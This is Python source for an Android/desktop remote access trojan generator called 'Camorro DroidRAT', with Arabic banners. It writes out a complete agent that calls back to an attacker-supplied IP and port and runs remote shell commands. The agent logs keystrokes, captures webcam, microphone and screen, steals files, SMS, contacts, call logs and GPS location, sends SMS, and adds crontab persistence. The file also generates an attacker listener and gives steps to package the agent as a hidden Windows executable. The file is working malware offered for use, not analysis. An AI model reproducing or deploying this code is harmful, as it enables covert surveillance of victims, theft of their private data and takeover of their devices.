#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro DroidRAT v3.0
RAT كامل متكامل — تحكم كامل بالجهاز المستهدف:
كاميرا، مايك، GPS، SMS، ملفات، كول، شاشة
"""

import os
import tempfile
from core.utils import print_status, pause, input_target, save_result
from core.colors import bcolors

class DroidRAT:
    def __init__(self):
        self.lhost = None
        self.lport = None
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_rat_")

    def generate_payload(self):
        """Generate comprehensive RAT payload"""
        output_dir = os.path.join(self.temp_dir, "payload")
        os.makedirs(output_dir, exist_ok=True)
        
        # ---- Main RAT Python script for target ----
        rat_script = f'''#!/usr/bin/env python3
# Camorro DroidRAT v3.0 - Agent
import socket, subprocess, os, sys, base64, json, threading, time
from datetime import datetime

SERVER = "{self.lhost}"
PORT = {self.lport}

class CamorroAgent:
    def __init__(self):
        self.sock = None
        self.connected = False
        self.commands = {{
            "shell": self.cmd_shell,
            "download": self.cmd_download,
            "upload": self.cmd_upload,
            "screenshot": self.cmd_screenshot,
            "keylog_start": self.cmd_keylog_start,
            "keylog_stop": self.cmd_keylog_stop,
            "webcam": self.cmd_webcam,
            "mic": self.cmd_mic,
            "location": self.cmd_location,
            "sms_list": self.cmd_sms_list,
            "sms_send": self.cmd_sms_send,
            "contacts": self.cmd_contacts,
            "call_logs": self.cmd_call_logs,
            "file_list": self.cmd_file_list,
            "persist": self.cmd_persist,
            "info": self.cmd_info,
            "exit": self.cmd_exit,
        }}
        self.keylog_active = False
        self.keylog_buffer = []
    
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((SERVER, PORT))
                self.connected = True
                self.send_json({{"type": "info", "data": self.get_system_info()}})
                self.handle()
            except Exception:
                time.sleep(5)
    
    def send_json(self, data):
        try:
            msg = json.dumps(data) + "\\n"
            self.sock.send(msg.encode())
        except:
            self.connected = False
    
    def handle(self):
        buffer = ""
        while self.connected:
            try:
                data = self.sock.recv(65536).decode()
                if not data:
                    break
                buffer += data
                while "\\n" in buffer:
                    line, buffer = buffer.split("\\n", 1)
                    if line.strip():
                        try:
                            cmd = json.loads(line)
                            self.process_command(cmd)
                        except:
                            pass
            except:
                break
        self.connected = False
    
    def process_command(self, cmd):
        action = cmd.get("action", "")
        if action in self.commands:
            threading.Thread(target=self.commands[action], args=(cmd,), daemon=True).start()
    
    def get_system_info(self):
        info = {{
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "cwd": os.getcwd(),
            "user": os.environ.get("USER", "unknown"),
            "time": datetime.now().isoformat(),
        }}
        # Try Android-specific info
        try:
            info["android"] = subprocess.check_output(["getprop", "ro.build.version.release"], text=True).strip()
        except:
            pass
        return info
    
    def cmd_shell(self, cmd):
        command = cmd.get("command", "id")
        try:
            r = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = r.stdout + r.stderr
        except subprocess.TimeoutExpired:
            output = "[TIMEOUT] Command timed out"
        except Exception as e:
            output = str(e)
        self.send_json({{"type": "shell", "data": output[:50000]}})
    
    def cmd_download(self, cmd):
        path = cmd.get("path", "")
        if os.path.isfile(path):
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send_json({{"type": "file", "name": os.path.basename(path), "data": data}})
        else:
            self.send_json({{"type": "error", "data": f"File not found: {{path}}"}})
    
    def cmd_upload(self, cmd):
        path = cmd.get("path", "/tmp/uploaded")
        data = base64.b64decode(cmd.get("data", ""))
        with open(path, "wb") as f:
            f.write(data)
        self.send_json({{"type": "upload", "data": f"Written {{len(data)}} bytes to {{path}}"}})
    
    def cmd_screenshot(self, cmd):
        try:
            import pyautogui
            img = pyautogui.screenshot()
            img_path = "/tmp/screenshot.png"
            img.save(img_path)
            with open(img_path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send_json({{"type": "screenshot", "data": data}})
        except:
            self.send_json({{"type": "error", "data": "Screenshot not available"}})
    
    def cmd_keylog_start(self, cmd):
        self.keylog_active = True
        threading.Thread(target=self._keylogger_loop, daemon=True).start()
        self.send_json({{"type": "keylog", "data": "Keylogger started"}})
    
    def _keylogger_loop(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if self.keylog_active:
                    try:
                        k = key.char
                    except:
                        k = str(key)
                    self.keylog_buffer.append(k)
                    if len(self.keylog_buffer) > 20:
                        self.send_json({{"type": "keylog", "data": "".join(self.keylog_buffer)}})
                        self.keylog_buffer = []
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except:
            pass
    
    def cmd_keylog_stop(self, cmd):
        self.keylog_active = False
        self.send_json({{"type": "keylog", "data": "Keylogger stopped"}})
    
    def cmd_webcam(self, cmd):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, img = cv2.imencode(".jpg", frame)
                data = base64.b64encode(img.tobytes()).decode()
                self.send_json({{"type": "webcam", "data": data}})
            cap.release()
        except:
            self.send_json({{"type": "error", "data": "Webcam not available"}})
    
    def cmd_mic(self, cmd):
        duration = cmd.get("duration", 5)
        try:
            import sounddevice as sd
            import soundfile as sf
            fs = 44100
            recording = sd.rec(int(fs * duration), samplerate=fs, channels=1)
            sd.wait()
            import tempfile
            path = "/tmp/mic.wav"
            sf.write(path, recording, fs)
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send_json({{"type": "mic", "data": data, "duration": duration}})
        except:
            self.send_json({{"type": "error", "data": "Mic not available"}})
    
    def cmd_location(self, cmd):
        try:
            # Try GPS via Android termux-location
            r = subprocess.run(["termux-location"], capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                self.send_json({{"type": "location", "data": r.stdout}})
                return
        except:
            pass
        self.send_json({{"type": "error", "data": "Location not available"}})
    
    def cmd_sms_list(self, cmd):
        import sqlite3, glob
        sms_data = []
        paths = glob.glob("/data/data/com.android.providers.telephony/databases/mmssms.db")
        paths += glob.glob("/storage/emulated/0/Android/data/*/databases/*.db")
        for path in paths[:3]:
            try:
                conn = sqlite3.connect(path)
                c = conn.cursor()
                c.execute("SELECT address, body, date FROM sms ORDER BY date DESC LIMIT 50")
                for row in c.fetchall():
                    sms_data.append({{"from": row[0], "body": row[1][:100], "date": row[2]}})
                conn.close()
            except:
                pass
        self.send_json({{"type": "sms_list", "data": sms_data}})
    
    def cmd_sms_send(self, cmd):
        number = cmd.get("number", "")
        message = cmd.get("message", "")
        try:
            subprocess.run(["termux-sms-send", "-n", number, message], timeout=10)
            self.send_json({{"type": "sms_send", "data": f"SMS sent to {{number}}"}})
        except Exception as e:
            self.send_json({{"type": "error", "data": str(e)}})
    
    def cmd_contacts(self, cmd):
        import sqlite3
        contacts = []
        paths = ["/data/data/com.android.providers.contacts/databases/contacts2.db"]
        for path in paths:
            try:
                conn = sqlite3.connect(path)
                c = conn.cursor()
                c.execute("SELECT display_name, data1 FROM raw_contacts JOIN data ON raw_contacts._id=data.raw_contact_id LIMIT 50")
                for row in c.fetchall():
                    contacts.append({{"name": row[0], "number": row[1]}})
                conn.close()
            except:
                pass
        self.send_json({{"type": "contacts", "data": contacts}})
    
    def cmd_call_logs(self, cmd):
        import sqlite3
        logs = []
        paths = ["/data/data/com.android.providers.contacts/databases/calllog.db",
                  "/data/data/com.android.providers.telephony/databases/calllog.db"]
        for path in paths:
            try:
                conn = sqlite3.connect(path)
                c = conn.cursor()
                c.execute("SELECT number, duration, date, type FROM calls ORDER BY date DESC LIMIT 50")
                for row in c.fetchall():
                    logs.append({{"number": row[0], "duration": row[1], "date": row[2], "type": row[3]}})
                conn.close()
            except:
                pass
        self.send_json({{"type": "call_logs", "data": logs}})
    
    def cmd_file_list(self, cmd):
        path = cmd.get("path", "/sdcard")
        try:
            files = os.listdir(path)
            self.send_json({{"type": "file_list", "path": path, "files": files[:100]}})
        except Exception as e:
            self.send_json({{"type": "error", "data": str(e)}})
    
    def cmd_persist(self, cmd):
        method = cmd.get("method", "cron")
        payload = sys.argv[0]
        if method == "cron":
            cron_line = f"@reboot python3 {{payload}} &\\n"
            try:
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
                self.send_json({{"type": "persist", "data": "Cron persistence added"}})
            except:
                self.send_json({{"type": "error", "data": "Cannot write crontab"}})
    
    def cmd_info(self, cmd):
        self.send_json({{"type": "info", "data": self.get_system_info()}})
    
    def cmd_exit(self, cmd):
        self.connected = False
        sys.exit(0)

if __name__ == "__main__":
    agent = CamorroAgent()
    agent.connect()
'''
        
        rat_path = os.path.join(output_dir, "camorro_agent.py")
        with open(rat_path, "w") as f:
            f.write(rat_script)
        
        os.chmod(rat_path, 0o755)
        
        # ---- Windows batch converter ----
        with open(os.path.join(output_dir, "py_to_exe.bat"), "w") as f:
            f.write("pyinstaller --onefile --noconsole camorro_agent.py\n")
        
        print_status(f"RAT agent created: {rat_path}", "ok")
        
        # ---- Create listener script for attacker ----
        listener_file = os.path.join(self.temp_dir, "camorro_listener.py")
        with open(listener_file, "w") as f:
            f.write(self.get_listener_code())
        
        return rat_path, listener_file

    def get_listener_code(self):
        return f'''#!/usr/bin/env python3
# Camorro RAT Listener v3.0
import socket, threading, json, base64, os
from datetime import datetime

class CamorroListener:
    def __init__(self, host="{self.lhost}", port={self.lport}):
        self.host = host
        self.port = port
        self.sessions = {{}}
    
    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(5)
        print(f"[*] Camorro RAT listener on :{{self.port}}")
        while True:
            conn, addr = s.accept()
            print(f"[+] Session from {{addr[0]}}:{{addr[1]}}")
            t = threading.Thread(target=self.handle_session, args=(conn, addr))
            t.daemon = True
            t.start()
    
    def handle_session(self, conn, addr):
        session_id = f"{{addr[0]}}:{{addr[1]}}"
        self.sessions[session_id] = conn
        buffer = ""
        try:
            while True:
                data = conn.recv(65536).decode()
                if not data:
                    break
                buffer += data
                while "\\n" in buffer:
                    line, buffer = buffer.split("\\n", 1)
                    if line.strip():
                        self.process_msg(session_id, line)
        except:
            pass
        print(f"[-] Session lost: {{session_id}}")
        del self.sessions[session_id]
    
    def process_msg(self, sid, msg):
        try:
            data = json.loads(msg)
            msg_type = data.get("type", "unknown")
            msg_data = data.get("data", "")
            
            if msg_type == "info":
                print(f"\\n[+] {{sid}} - System Info:")
                for k, v in msg_data.items():
                    print(f"    {{k}}: {{v}}")
            elif msg_type == "shell":
                print(f"\\n[OUTPUT] {{sid}}:\\n{{msg_data}}")
            elif msg_type == "file":
                name = data.get("name", "unknown")
                path = f"downloads/{{sid}}_{name}"
                os.makedirs("downloads", exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(msg_data))
                print(f"[+] File saved: {{path}}")
            elif msg_type == "screenshot":
                path = f"screenshots/{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
                os.makedirs("screenshots", exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(msg_data))
                print(f"[+] Screenshot: {{path}}")
            elif msg_type == "webcam":
                path = f"webcam/{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg"
                os.makedirs("webcam", exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(msg_data))
                print(f"[+] Webcam capture: {{path}}")
            elif msg_type == "mic":
                path = f"audio/{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.wav"
                os.makedirs("audio", exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(msg_data))
                print(f"[+] Audio: {{path}} ({{data.get('duration', '?')}}s)")
            elif msg_type == "keylog":
                print(f"[KEYLOG] {{sid}}: {{msg_data}}")
            elif msg_type == "location":
                print(f"[LOCATION] {{sid}}: {{msg_data}}")
            elif msg_type in ("sms_list", "contacts", "call_logs"):
                print(f"[{{msg_type.upper()}}] {{sid}}: {{len(msg_data)}} records")
                for item in msg_data[:5]:
                    print(f"    {{item}}")
            elif msg_type == "error":
                print(f"[ERROR] {{sid}}: {{msg_data}}")
            else:
                print(f"[{{msg_type}}] {{sid}}: {{str(msg_data)[:200]}}")
        except Exception as e:
            print(f"[PARSE ERROR] {{e}}")
    
    def interactive(self):
        while True:
            cmd = input("camorro> ").strip()
            if not cmd:
                continue
            if cmd.startswith("sessions"):
                print("Active sessions:", list(self.sessions.keys()))
            elif cmd.startswith("use "):
                sid = cmd[4:].strip()
                if sid in self.sessions:
                    self.interact_session(sid)
                else:
                    print(f"Session {{sid}} not found")
            elif cmd == "exit":
                break
    
    def interact_session(self, sid):
        conn = self.sessions[sid]
        print(f"[*] Interacting with {{sid}}. Type 'back' to return.")
        while True:
            cmd = input(f"rat/{{sid}}> ").strip()
            if cmd == "back":
                break
            elif cmd.startswith("shell "):
                msg = json.dumps({{"action": "shell", "command": cmd[6:]}}) + "\\n"
                conn.send(msg.encode())
            elif cmd.startswith("download "):
                msg = json.dumps({{"action": "download", "path": cmd[9:]}}) + "\\n"
                conn.send(msg.encode())
            elif cmd == "screenshot":
                conn.send(json.dumps({{"action": "screenshot"}}).encode() + b"\\n")
            elif cmd == "webcam":
                conn.send(json.dumps({{"action": "webcam"}}).encode() + b"\\n")
            elif cmd.startswith("mic "):
                secs = cmd[4:].strip()
                conn.send(json.dumps({{"action": "mic", "duration": int(secs)}}).encode() + b"\\n")
            elif cmd == "keylog_start":
                conn.send(json.dumps({{"action": "keylog_start"}}).encode() + b"\\n")
            elif cmd == "keylog_stop":
                conn.send(json.dumps({{"action": "keylog_stop"}}).encode() + b"\\n")
            elif cmd == "location":
                conn.send(json.dumps({{"action": "location"}}).encode() + b"\\n")
            elif cmd == "sms_list":
                conn.send(json.dumps({{"action": "sms_list"}}).encode() + b"\\n")
            elif cmd.startswith("sms_send "):
                parts = cmd[9:].split(" ", 1)
                if len(parts) == 2:
                    conn.send(json.dumps({{"action": "sms_send", "number": parts[0], "message": parts[1]}}).encode() + b"\\n")
            elif cmd == "contacts":
                conn.send(json.dumps({{"action": "contacts"}}).encode() + b"\\n")
            elif cmd == "call_logs":
                conn.send(json.dumps({{"action": "call_logs"}}).encode() + b"\\n")
            elif cmd.startswith("file_list "):
                conn.send(json.dumps({{"action": "file_list", "path": cmd[10:]}}).encode() + b"\\n")
            elif cmd == "info":
                conn.send(json.dumps({{"action": "info"}}).encode() + b"\\n")
            elif cmd == "exit":
                conn.send(json.dumps({{"action": "exit"}}).encode() + b"\\n")
                break
            else:
                print("Commands: shell <cmd>, download <path>, screenshot, webcam, mic <secs>, keylog_start/stop, location, sms_list, sms_send <num> <msg>, contacts, call_logs, file_list <path>, info, exit")

if __name__ == "__main__":
    listener = CamorroListener()
    threading.Thread(target=listener.start, daemon=True).start()
    listener.interactive()
''' 

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║           CAMORRO DROID RAT — FULL CONTROL             ║
║    RAT متكامل — كاميرا، مايك، GPS، SMS، ملفات، شاشة    ║
║    كل شيء بجهاز واحد من طرفك 🎯                       ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        self.lhost = input_target("Your IP (LHOST)")
        self.lport = input("LPORT [6666]: ").strip() or "6666"
        
        agent, listener = self.generate_payload()
        
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ DROIDRAT READY!                                      ║
║                                                          ║
║  🔫 Agent (target): {agent}  ║
║  🎧 Listener (you):   {listener}    ║
║  🎯 Callback:         {self.lhost}:{self.lport}                          ║
║                                                          ║
║  ▶️  على جهازك (Start listener):                          ║
║     python3 {listener}                                     ║
║                                                          ║
║  ▶️  على الجهاز المستهدف (Run agent):                     ║
║     python3 camorro_agent.py                              ║
║                                                          ║
║  ▶️  تحويل agent إلى exe (Windows):                       ║
║     pip install pyinstaller                               ║
║     pyinstaller --onefile --noconsole camorro_agent.py   ║
║                                                          ║
║  ⚡ أوامر التحكم بعد الاتصال:                              ║
║  ┌──────────────┬────────────────────────────────────┐   ║
║  │ shell <cmd>  │ تشغيل أوامر على الجهاز              │   ║
║  │ download <p> │ تحميل ملف من الجهاز                 │   ║
║  │ screenshot   │ تصوير الشاشة                        │   ║
║  │ webcam       │ تصوير بالكاميرا                     │   ║
║  │ mic <secs>   │ تسجيل الصوت                         │   ║
║  │ location     │ تحديد الموقع GPS                    │   ║
║  │ sms_list     │ سحب الرسائل                         │   ║
║  │ contacts     │ سحب جهات الاتصال                    │   ║
║  │ call_logs    │ سجل المكالمات                       │   ║
║  │ file_list <p>│ استعراض الملفات                     │   ║
║  │ keylog_start │ بدأ تسجيل لوحة المفاتيح             │   ║
║  └──────────────┴────────────────────────────────────┘   ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        save_result(
            f"logs/droidrat_{self.lhost}.txt",
            f"Agent: {agent}\nListener: {listener}\nLHOST: {self.lhost}:{self.lport}"
        )
        
        pause()

if __name__ == "__main__":
    DroidRAT().run()
